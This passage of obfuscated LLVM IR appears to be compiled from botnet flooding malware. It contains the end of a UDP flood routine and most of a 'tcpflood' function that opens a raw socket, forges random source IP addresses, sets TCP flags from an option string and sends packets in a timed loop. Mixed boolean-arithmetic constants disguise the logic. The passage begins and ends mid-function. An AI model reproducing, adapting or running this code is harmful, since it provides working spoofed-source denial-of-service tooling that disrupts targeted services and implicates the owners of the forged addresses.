  %256 = load %struct.udphdr*, %struct.udphdr** %23, align 8
  %257 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %256, i32 0, i32 0
  store i16 %255, i16* %257, align 2
  %258 = load i32, i32* %6, align 4
  %259 = icmp eq i32 %258, 0
  br i1 %259, label %260, label %262

; <label>:260:                                    ; preds = %250
  %261 = call i32 @rand_cmwc()
  br label %267

; <label>:262:                                    ; preds = %250
  %263 = load i32, i32* %6, align 4
  %264 = trunc i32 %263 to i16
  %265 = call zeroext i16 @htons(i16 zeroext %264) #9
  %266 = zext i16 %265 to i32
  br label %267

; <label>:267:                                    ; preds = %262, %260
  %268 = phi i32 [ %261, %260 ], [ %266, %262 ]
  %269 = trunc i32 %268 to i16
  %270 = load %struct.udphdr*, %struct.udphdr** %23, align 8
  %271 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %270, i32 0, i32 1
  store i16 %269, i16* %271, align 2
  %272 = call i32 @rand_cmwc()
  %273 = trunc i32 %272 to i16
  %274 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %275 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %274, i32 0, i32 3
  store i16 %273, i16* %275, align 4
  %276 = load i32, i32* %20, align 4
  %277 = call i32 @getRandomIP(i32 %276)
  %278 = call i32 @htonl(i32 %277) #9
  %279 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %280 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %279, i32 0, i32 8
  store i32 %278, i32* %280, align 4
  %281 = bitcast i8* %179 to i16*
  %282 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %283 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %282, i32 0, i32 2
  %284 = load i16, i16* %283, align 2
  %285 = zext i16 %284 to i32
  %286 = call zeroext i16 @csum(i16* %281, i32 %285)
  %287 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %288 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %287, i32 0, i32 7
  store i16 %286, i16* %288, align 2
  %289 = load i32, i32* %25, align 4
  %290 = load i32, i32* %12, align 4
  %291 = icmp eq i32 %289, %290
  br i1 %291, label %292, label %299

; <label>:292:                                    ; preds = %267
  %293 = call i64 @time(i64* null) #6
  %294 = load i32, i32* %24, align 4
  %295 = sext i32 %294 to i64
  %296 = icmp sgt i64 %293, %295
  br i1 %296, label %297, label %298

; <label>:297:                                    ; preds = %292
  br label %305

; <label>:298:                                    ; preds = %292
  store i32 0, i32* %25, align 4
  br label %249

; <label>:299:                                    ; preds = %267
  %300 = load i32, i32* %25, align 4
  %301 = add i32 %300, 470554144
  %302 = add i32 %301, 1
  %303 = sub i32 %302, 470554144
  %304 = add i32 %300, 1
  store i32 %303, i32* %25, align 4
  br label %249

; <label>:305:                                    ; preds = %297
  %306 = load i8*, i8** %21, align 8
  call void @llvm.stackrestore(i8* %306)
  br label %307

; <label>:307:                                    ; preds = %305, %125, %119, %114, %65, %54, %43
  ret void
}

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) #1

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #2

; Function Attrs: nounwind
declare i64 @time(i64*) #2

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) #5

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #2

; Function Attrs: nounwind
declare void @srand(i32) #2

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #6

; Function Attrs: nounwind readnone
declare i32 @htonl(i32) #1

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #6

; Function Attrs: noinline nounwind uwtable
define void @tcpflood(i8*, i32, i32, i32, i8*) #0 {
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i8*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca %struct.sockaddr_in, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i8*, align 8
  %19 = alloca %struct.iphdr*, align 8
  %20 = alloca %struct.tcphdr*, align 8
  %21 = alloca i8*, align 8
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  store i8* %0, i8** %6, align 8
  store i32 %1, i32* %7, align 4
  store i32 %2, i32* %8, align 4
  store i32 %3, i32* %9, align 4
  store i8* %4, i8** %10, align 8
  store i32 32, i32* %11, align 4
  store i32 10, i32* %12, align 4
  %24 = load i32, i32* %12, align 4
  store i32 %24, i32* %13, align 4
  %25 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 0
  store i16 2, i16* %25, align 4
  %26 = load i32, i32* %7, align 4
  %27 = icmp eq i32 %26, 0
  br i1 %27, label %28, label %32

; <label>:28:                                     ; preds = %5
  %29 = call i32 @rand_cmwc()
  %30 = trunc i32 %29 to i16
  %31 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 1
  store i16 %30, i16* %31, align 2
  br label %37

; <label>:32:                                     ; preds = %5
  %33 = load i32, i32* %7, align 4
  %34 = trunc i32 %33 to i16
  %35 = call zeroext i16 @htons(i16 zeroext %34) #9
  %36 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 1
  store i16 %35, i16* %36, align 2
  br label %37

; <label>:37:                                     ; preds = %32, %28
  %38 = load i8*, i8** %6, align 8
  %39 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 2
  %40 = call i32 @getHost(i8* %38, %struct.in_addr* %39)
  %41 = icmp ne i32 %40, 0
  br i1 %41, label %42, label %43

; <label>:42:                                     ; preds = %37
  br label %496

; <label>:43:                                     ; preds = %37
  %44 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 3
  %45 = getelementptr inbounds [8 x i8], [8 x i8]* %44, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %45, i8 0, i64 8, i32 4, i1 false)
  %46 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %46, i32* %15, align 4
  %47 = load i32, i32* %15, align 4
  %48 = icmp ne i32 %47, 0
  br i1 %48, label %50, label %49

; <label>:49:                                     ; preds = %43
  br label %496

; <label>:50:                                     ; preds = %43
  store i32 1, i32* %16, align 4
  %51 = load i32, i32* %15, align 4
  %52 = bitcast i32* %16 to i8*
  %53 = call i32 @setsockopt(i32 %51, i32 0, i32 3, i8* %52, i32 4) #6
  %54 = icmp slt i32 %53, 0
  br i1 %54, label %55, label %56

; <label>:55:                                     ; preds = %50
  br label %496

; <label>:56:                                     ; preds = %50
  %57 = load i32, i32* %11, align 4
  %58 = icmp eq i32 %57, 0
  br i1 %58, label %59, label %60

; <label>:59:                                     ; preds = %56
  store i32 0, i32* %17, align 4
  br label %76

; <label>:60:                                     ; preds = %56
  %61 = load i32, i32* %11, align 4
  %62 = sub i32 0, %61
  %63 = add i32 32, %62
  %64 = sub nsw i32 32, %61
  %65 = shl i32 1, %63
  %66 = add i32 %65, 1299828285
  %67 = sub i32 %66, 1
  %68 = sub i32 %67, 1299828285
  %69 = sub nsw i32 %65, 1
  %70 = xor i32 %68, -1
  %71 = and i32 -1, %70
  %72 = xor i32 -1, -1
  %73 = and i32 %68, %72
  %74 = or i32 %71, %73
  %75 = xor i32 %68, -1
  store i32 %74, i32* %17, align 4
  br label %76

; <label>:76:                                     ; preds = %60, %59
  %77 = load i32, i32* %9, align 4
  %78 = sext i32 %77 to i64
  %79 = sub i64 0, %78
  %80 = sub i64 40, %79
  %81 = add i64 40, %78
  %82 = call i8* @llvm.stacksave()
  store i8* %82, i8** %18, align 8
  %83 = alloca i8, i64 %80, align 16
  %84 = bitcast i8* %83 to %struct.iphdr*
  store %struct.iphdr* %84, %struct.iphdr** %19, align 8
  %85 = load %struct.iphdr*, %struct.iphdr** %19, align 8
  %86 = bitcast %struct.iphdr* %85 to i8*
  %87 = getelementptr i8, i8* %86, i64 20
  %88 = bitcast i8* %87 to %struct.tcphdr*
  store %struct.tcphdr* %88, %struct.tcphdr** %20, align 8
  %89 = load %struct.iphdr*, %struct.iphdr** %19, align 8
  %90 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 2
  %91 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %90, i32 0, i32 0
  %92 = load i32, i32* %91, align 4
  %93 = load i32, i32* %17, align 4
  %94 = call i32 @getRandomIP(i32 %93)
  %95 = call i32 @htonl(i32 %94) #9
  %96 = load i32, i32* %9, align 4
  %97 = sext i32 %96 to i64
  %98 = sub i64 0, %97
  %99 = sub i64 20, %98
  %100 = add i64 20, %97
  %101 = trunc i64 %99 to i32
  call void @makeIPPacket(%struct.iphdr* %89, i32 %92, i32 %95, i8 zeroext 6, i32 %101)
  %102 = call i32 @rand_cmwc()
  %103 = trunc i32 %102 to i16
  %104 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %105 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %104, i32 0, i32 0
  %106 = bitcast %union.anon* %105 to %struct.anon.0*
  %107 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %106, i32 0, i32 0
  store i16 %103, i16* %107, align 4
  %108 = call i32 @rand_cmwc()
  %109 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %110 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %109, i32 0, i32 0
  %111 = bitcast %union.anon* %110 to %struct.anon.0*
  %112 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %111, i32 0, i32 2
  store i32 %108, i32* %112, align 4
  %113 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %114 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %113, i32 0, i32 0
  %115 = bitcast %union.anon* %114 to %struct.anon.0*
  %116 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %115, i32 0, i32 3
  store i32 0, i32* %116, align 4
  %117 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %118 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %117, i32 0, i32 0
  %119 = bitcast %union.anon* %118 to %struct.anon.0*
  %120 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %119, i32 0, i32 4
  %121 = load i16, i16* %120, align 4
  %122 = xor i16 -241, -1
  %123 = xor i16 %121, %122
  %124 = and i16 %123, %121
  %125 = and i16 %121, -241
  %126 = and i16 %124, 80
  %127 = xor i16 %124, 80
  %128 = or i16 %126, %127
  %129 = or i16 %124, 80
  store i16 %128, i16* %120, align 4
  %130 = load i8*, i8** %10, align 8
  %131 = call i32 @strcmp(i8* %130, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.42, i32 0, i32 0)) #10
  %132 = icmp ne i32 %131, 0
  br i1 %132, label %239, label %133

; <label>:133:                                    ; preds = %76
  %134 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %135 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %134, i32 0, i32 0
  %136 = bitcast %union.anon* %135 to %struct.anon.0*
  %137 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %136, i32 0, i32 4
  %138 = load i16, i16* %137, align 4
  %139 = xor i16 %138, -1
  %140 = xor i16 -513, -1
  %141 = xor i16 -2438, -1
  %142 = or i16 %139, %140
  %143 = or i16 -2438, %141
  %144 = xor i16 %142, -1
  %145 = and i16 %144, %143
  %146 = and i16 %138, -513
  %147 = xor i16 %145, -1
  %148 = xor i16 512, -1
  %149 = xor i16 7235, -1
  %150 = and i16 %147, 7235
  %151 = and i16 %145, %149
  %152 = and i16 %148, 7235
  %153 = and i16 512, %149
  %154 = or i16 %150, %151
  %155 = or i16 %152, %153
  %156 = xor i16 %154, %155
  %157 = or i16 %147, %148
  %158 = xor i16 %157, -1
  %159 = or i16 7235, %149
  %160 = and i16 %158, %159
  %161 = or i16 %156, %160
  %162 = or i16 %145, 512
  store i16 %161, i16* %137, align 4
  %163 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %164 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %163, i32 0, i32 0
  %165 = bitcast %union.anon* %164 to %struct.anon.0*
  %166 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %165, i32 0, i32 4
  %167 = load i16, i16* %166, align 4
  %168 = xor i16 -1025, -1
  %169 = xor i16 %167, %168
  %170 = and i16 %169, %167
  %171 = and i16 %167, -1025
  %172 = and i16 %170, 1024
  %173 = xor i16 %170, 1024
  %174 = or i16 %172, %173
  %175 = or i16 %170, 1024
  store i16 %174, i16* %166, align 4
  %176 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %177 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %176, i32 0, i32 0
  %178 = bitcast %union.anon* %177 to %struct.anon.0*
  %179 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %178, i32 0, i32 4
  %180 = load i16, i16* %179, align 4
  %181 = xor i16 -257, -1
  %182 = xor i16 %180, %181
  %183 = and i16 %182, %180
  %184 = and i16 %180, -257
  %185 = and i16 %183, 256
  %186 = xor i16 %183, 256
  %187 = or i16 %185, %186
  %188 = or i16 %183, 256
  store i16 %187, i16* %179, align 4
  %189 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %190 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %189, i32 0, i32 0
  %191 = bitcast %union.anon* %190 to %struct.anon.0*
  %192 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %191, i32 0, i32 4
  %193 = load i16, i16* %192, align 4
  %194 = xor i16 -4097, -1
  %195 = xor i16 %193, %194
  %196 = and i16 %195, %193
  %197 = and i16 %193, -4097
  %198 = xor i16 %196, -1
  %199 = xor i16 4096, -1
  %200 = xor i16 12739, -1
  %201 = and i16 %198, 12739
  %202 = and i16 %196, %200
  %203 = and i16 %199, 12739
  %204 = and i16 4096, %200
  %205 = or i16 %201, %202
  %206 = or i16 %203, %204
  %207 = xor i16 %205, %206
  %208 = or i16 %198, %199
  %209 = xor i16 %208, -1
  %210 = or i16 12739, %200
  %211 = and i16 %209, %210
  %212 = or i16 %207, %211
  %213 = or i16 %196, 4096
  store i16 %212, i16* %192, align 4
  %214 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %215 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %214, i32 0, i32 0
  %216 = bitcast %union.anon* %215 to %struct.anon.0*
  %217 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %216, i32 0, i32 4
  %218 = load i16, i16* %217, align 4
  %219 = xor i16 -2049, -1
  %220 = xor i16 %218, %219
  %221 = and i16 %220, %218
  %222 = and i16 %218, -2049
  %223 = xor i16 %221, -1
  %224 = xor i16 2048, -1
  %225 = xor i16 24244, -1
  %226 = and i16 %223, 24244
  %227 = and i16 %221, %225
  %228 = and i16 %224, 24244
  %229 = and i16 2048, %225
  %230 = or i16 %226, %227
  %231 = or i16 %228, %229
  %232 = xor i16 %230, %231
  %233 = or i16 %223, %224
  %234 = xor i16 %233, -1
  %235 = or i16 24244, %225
  %236 = and i16 %234, %235
  %237 = or i16 %232, %236
  %238 = or i16 %221, 2048
  store i16 %237, i16* %217, align 4
  br label %381

; <label>:239:                                    ; preds = %76
  %240 = load i8*, i8** %10, align 8
  %241 = call i8* @strtok(i8* %240, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.43, i32 0, i32 0)) #6
  store i8* %241, i8** %21, align 8
  br label %242

; <label>:242:                                    ; preds = %378, %239
  %243 = load i8*, i8** %21, align 8
  %244 = icmp ne i8* %243, null
  br i1 %244, label %245, label %380

; <label>:245:                                    ; preds = %242
  %246 = load i8*, i8** %21, align 8
  %247 = call i32 @strcmp(i8* %246, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.44, i32 0, i32 0)) #10
  %248 = icmp ne i32 %247, 0
  br i1 %248, label %263, label %249

; <label>:249:                                    ; preds = %245
  %250 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %251 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %250, i32 0, i32 0
  %252 = bitcast %union.anon* %251 to %struct.anon.0*
  %253 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %252, i32 0, i32 4
  %254 = load i16, i16* %253, align 4
  %255 = xor i16 -513, -1
  %256 = xor i16 %254, %255
  %257 = and i16 %256, %254
  %258 = and i16 %254, -513
  %259 = and i16 %257, 512
  %260 = xor i16 %257, 512
  %261 = or i16 %259, %260
  %262 = or i16 %257, 512
  store i16 %261, i16* %253, align 4
  br label %378

; <label>:263:                                    ; preds = %245
  %264 = load i8*, i8** %21, align 8
  %265 = call i32 @strcmp(i8* %264, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.45, i32 0, i32 0)) #10
  %266 = icmp ne i32 %265, 0
  br i1 %266, label %293, label %267

; <label>:267:                                    ; preds = %263
  %268 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %269 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %268, i32 0, i32 0
  %270 = bitcast %union.anon* %269 to %struct.anon.0*
  %271 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %270, i32 0, i32 4
  %272 = load i16, i16* %271, align 4
  %273 = xor i16 -1025, -1
  %274 = xor i16 %272, %273
  %275 = and i16 %274, %272
  %276 = and i16 %272, -1025
  %277 = xor i16 %275, -1
  %278 = xor i16 1024, -1
  %279 = xor i16 -13486, -1
  %280 = and i16 %277, -13486
  %281 = and i16 %275, %279
  %282 = and i16 %278, -13486
  %283 = and i16 1024, %279
  %284 = or i16 %280, %281
  %285 = or i16 %282, %283
  %286 = xor i16 %284, %285
  %287 = or i16 %277, %278
  %288 = xor i16 %287, -1
  %289 = or i16 -13486, %279
  %290 = and i16 %288, %289
  %291 = or i16 %286, %290
  %292 = or i16 %275, 1024
  store i16 %291, i16* %271, align 4
  br label %377

; <label>:293:                                    ; preds = %263
  %294 = load i8*, i8** %21, align 8
  %295 = call i32 @strcmp(i8* %294, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.46, i32 0, i32 0)) #10
  %296 = icmp ne i32 %295, 0
  br i1 %296, label %327, label %297

; <label>:297:                                    ; preds = %293
  %298 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %299 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %298, i32 0, i32 0
  %300 = bitcast %union.anon* %299 to %struct.anon.0*
  %301 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %300, i32 0, i32 4
  %302 = load i16, i16* %301, align 4
  %303 = xor i16 %302, -1
  %304 = xor i16 -257, -1
  %305 = xor i16 -7102, -1
  %306 = or i16 %303, %304
  %307 = or i16 -7102, %305
  %308 = xor i16 %306, -1
  %309 = and i16 %308, %307
  %310 = and i16 %302, -257
  %311 = xor i16 %309, -1
  %312 = xor i16 256, -1
  %313 = xor i16 -14964, -1
  %314 = and i16 %311, -14964
  %315 = and i16 %309, %313
  %316 = and i16 %312, -14964
  %317 = and i16 256, %313
  %318 = or i16 %314, %315
  %319 = or i16 %316, %317
  %320 = xor i16 %318, %319
  %321 = or i16 %311, %312
  %322 = xor i16 %321, -1
  %323 = or i16 -14964, %313
  %324 = and i16 %322, %323
  %325 = or i16 %320, %324
  %326 = or i16 %309, 256
  store i16 %325, i16* %301, align 4
  br label %376

; <label>:327:                                    ; preds = %293
  %328 = load i8*, i8** %21, align 8
  %329 = call i32 @strcmp(i8* %328, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.47, i32 0, i32 0)) #10
  %330 = icmp ne i32 %329, 0
  br i1 %330, label %349, label %331

; <label>:331:                                    ; preds = %327
  %332 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %333 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %332, i32 0, i32 0
  %334 = bitcast %union.anon* %333 to %struct.anon.0*
  %335 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %334, i32 0, i32 4
  %336 = load i16, i16* %335, align 4
  %337 = xor i16 %336, -1
  %338 = xor i16 -4097, -1
  %339 = xor i16 28908, -1
  %340 = or i16 %337, %338
  %341 = or i16 28908, %339
  %342 = xor i16 %340, -1
  %343 = and i16 %342, %341
  %344 = and i16 %336, -4097
  %345 = and i16 %343, 4096
  %346 = xor i16 %343, 4096
  %347 = or i16 %345, %346
  %348 = or i16 %343, 4096
  store i16 %347, i16* %335, align 4
  br label %375

; <label>:349:                                    ; preds = %327
  %350 = load i8*, i8** %21, align 8
  %351 = call i32 @strcmp(i8* %350, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.48, i32 0, i32 0)) #10
  %352 = icmp ne i32 %351, 0
  br i1 %352, label %371, label %353

; <label>:353:                                    ; preds = %349
  %354 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %355 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %354, i32 0, i32 0
  %356 = bitcast %union.anon* %355 to %struct.anon.0*
  %357 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %356, i32 0, i32 4
  %358 = load i16, i16* %357, align 4
  %359 = xor i16 %358, -1
  %360 = xor i16 -2049, -1
  %361 = xor i16 8949, -1
  %362 = or i16 %359, %360
  %363 = or i16 8949, %361
  %364 = xor i16 %362, -1
  %365 = and i16 %364, %363
  %366 = and i16 %358, -2049
  %367 = and i16 %365, 2048
  %368 = xor i16 %365, 2048
  %369 = or i16 %367, %368
  %370 = or i16 %365, 2048
  store i16 %369, i16* %357, align 4
  br label %374

; <label>:371:                                    ; preds = %349
  %372 = load i8*, i8** %21, align 8
  %373 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.49, i32 0, i32 0), i8* %372)
  br label %374

; <label>:374:                                    ; preds = %371, %353
  br label %375

; <label>:375:                                    ; preds = %374, %331
  br label %376

; <label>:376:                                    ; preds = %375, %297
  br label %377

; <label>:377:                                    ; preds = %376, %267
  br label %378

; <label>:378:                                    ; preds = %377, %249
  %379 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.43, i32 0, i32 0)) #6
  store i8* %379, i8** %21, align 8
  br label %242

; <label>:380:                                    ; preds = %242
  br label %381

; <label>:381:                                    ; preds = %380, %133
  %382 = call i32 @rand_cmwc()
  %383 = trunc i32 %382 to i16
  %384 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %385 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %384, i32 0, i32 0
  %386 = bitcast %union.anon* %385 to %struct.anon.0*
  %387 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %386, i32 0, i32 5
  store i16 %383, i16* %387, align 2
  %388 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %389 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %388, i32 0, i32 0
  %390 = bitcast %union.anon* %389 to %struct.anon.0*
  %391 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %390, i32 0, i32 6
  store i16 0, i16* %391, align 4
  %392 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %393 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %392, i32 0, i32 0
  %394 = bitcast %union.anon* %393 to %struct.anon.0*
  %395 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %394, i32 0, i32 7
  store i16 0, i16* %395, align 2
  %396 = load i32, i32* %7, align 4
  %397 = icmp eq i32 %396, 0
  br i1 %397, label %398, label %400

; <label>:398:                                    ; preds = %381
  %399 = call i32 @rand_cmwc()
  br label %405

; <label>:400:                                    ; preds = %381
  %401 = load i32, i32* %7, align 4
  %402 = trunc i32 %401 to i16
  %403 = call zeroext i16 @htons(i16 zeroext %402) #9
  %404 = zext i16 %403 to i32
  br label %405

; <label>:405:                                    ; preds = %400, %398
  %406 = phi i32 [ %399, %398 ], [ %404, %400 ]
  %407 = trunc i32 %406 to i16
  %408 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %409 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %408, i32 0, i32 0
  %410 = bitcast %union.anon* %409 to %struct.anon.0*
  %411 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %410, i32 0, i32 1
  store i16 %407, i16* %411, align 2
  %412 = load %struct.iphdr*, %struct.iphdr** %19, align 8
  %413 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %414 = call zeroext i16 @tcpcsum(%struct.iphdr* %412, %struct.tcphdr* %413)
  %415 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %416 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %415, i32 0, i32 0
  %417 = bitcast %union.anon* %416 to %struct.anon.0*
  %418 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %417, i32 0, i32 6
  store i16 %414, i16* %418, align 4
  %419 = bitcast i8* %83 to i16*
  %420 = load %struct.iphdr*, %struct.iphdr** %19, align 8
  %421 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %420, i32 0, i32 2
  %422 = load i16, i16* %421, align 2
  %423 = zext i16 %422 to i32
  %424 = call zeroext i16 @csum(i16* %419, i32 %423)
  %425 = load %struct.iphdr*, %struct.iphdr** %19, align 8
  %426 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %425, i32 0, i32 7
  store i16 %424, i16* %426, align 2
  %427 = call i64 @time(i64* null) #6
  %428 = load i32, i32* %8, align 4
  %429 = sext i32 %428 to i64
  %430 = sub i64 0, %429
  %431 = sub i64 %427, %430
  %432 = add nsw i64 %427, %429
  %433 = trunc i64 %431 to i32
  store i32 %433, i32* %22, align 4
  store i32 0, i32* %23, align 4
  br label %434

; <label>:434:                                    ; preds = %488, %487, %405
  br label %435

; <label>:435:                                    ; preds = %434
  %436 = load i32, i32* %15, align 4
  %437 = bitcast %struct.sockaddr_in* %14 to %struct.sockaddr*
  %438 = call i64 @sendto(i32 %436, i8* %83, i64 %80, i32 0, %struct.sockaddr* %437, i32 16)
  %439 = load i32, i32* %17, align 4
  %440 = call i32 @getRandomIP(i32 %439)
  %441 = call i32 @htonl(i32 %440) #9
  %442 = load %struct.iphdr*, %struct.iphdr** %19, align 8
  %443 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %442, i32 0, i32 8
  store i32 %441, i32* %443, align 4
  %444 = call i32 @rand_cmwc()
  %445 = trunc i32 %444 to i16
  %446 = load %struct.iphdr*, %struct.iphdr** %19, align 8
  %447 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %446, i32 0, i32 3
  store i16 %445, i16* %447, align 4
  %448 = call i32 @rand_cmwc()
  %449 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %450 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %449, i32 0, i32 0
  %451 = bitcast %union.anon* %450 to %struct.anon.0*
  %452 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %451, i32 0, i32 2
  store i32 %448, i32* %452, align 4
  %453 = call i32 @rand_cmwc()
  %454 = trunc i32 %453 to i16
  %455 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %456 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %455, i32 0, i32 0
  %457 = bitcast %union.anon* %456 to %struct.anon.0*
  %458 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %457, i32 0, i32 0
  store i16 %454, i16* %458, align 4
  %459 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %460 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %459, i32 0, i32 0
  %461 = bitcast %union.anon* %460 to %struct.anon.0*
  %462 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %461, i32 0, i32 6
  store i16 0, i16* %462, align 4
  %463 = load %struct.iphdr*, %struct.iphdr** %19, align 8
  %464 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %465 = call zeroext i16 @tcpcsum(%struct.iphdr* %463, %struct.tcphdr* %464)
  %466 = load %struct.tcphdr*, %struct.tcphdr** %20, align 8
  %467 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %466, i32 0, i32 0
  %468 = bitcast %union.anon* %467 to %struct.anon.0*
  %469 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %468, i32 0, i32 6
  store i16 %465, i16* %469, align 4
  %470 = bitcast i8* %83 to i16*
  %471 = load %struct.iphdr*, %struct.iphdr** %19, align 8
  %472 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %471, i32 0, i32 2
  %473 = load i16, i16* %472, align 2
  %474 = zext i16 %473 to i32
  %475 = call zeroext i16 @csum(i16* %470, i32 %474)
  %476 = load %struct.iphdr*, %struct.iphdr** %19, align 8
  %477 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %476, i32 0, i32 7
  store i16 %475, i16* %477, align 2
  %478 = load i32, i32* %23, align 4
  %479 = load i32, i32* %13, align 4
  %480 = icmp eq i32 %478, %479
  br i1 %480, label %481, label %488

; <label>:481:                                    ; preds = %435
  %482 = call i64 @time(i64* null) #6
  %483 = load i32, i32* %22, align 4
  %484 = sext i32 %483 to i64
  %485 = icmp sgt i64 %482, %484
  br i1 %485, label %486, label %487

; <label>:486:                                    ; preds = %481
  br label %494

; <label>:487:                                    ; preds = %481
  store i32 0, i32* %23, align 4
  br label %434

; <label>:488:                                    ; preds = %435
  %489 = load i32, i32* %23, align 4
  %490 = sub i32 %489, -487257276
  %491 = add i32 %490, 1
  %492 = add i32 %491, -487257276
  %493 = add i32 %489, 1
  store i32 %492, i32* %23, align 4
  br label %434

; <label>:494:                                    ; preds = %486
  %495 = load i8*, i8** %18, align 8
